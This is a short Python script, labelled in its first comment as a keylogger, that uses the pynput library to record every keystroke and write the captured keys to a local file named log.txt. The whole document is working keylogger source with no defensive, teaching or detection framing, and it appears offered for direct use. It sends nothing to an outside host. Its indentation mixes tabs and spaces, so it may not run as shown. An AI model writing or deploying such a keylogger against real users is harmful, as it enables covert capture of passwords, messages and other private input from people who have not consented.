# keylogger using pynput module

import pynput
from pynput.keyboard import Key, Listener

keys = []

def on_press(key):
	
	keys.append(key)
	write_file(keys)

def write_file(keys):
	#open file in write mode
	with open('log.txt', 'w') as f:
		for key in keys:
			
			# removing ''
			k = str(key).replace("'","")
   
			if key == Key.enter:
       #if enter is pressed then create a new line 
				f.write('\n')
			else:
       #else write that key
				f.write(k)
       
			# explicitly adding a space after
			f.write(' ')
   

with Listener(on_press = on_press) as listener:
					
	listener.join()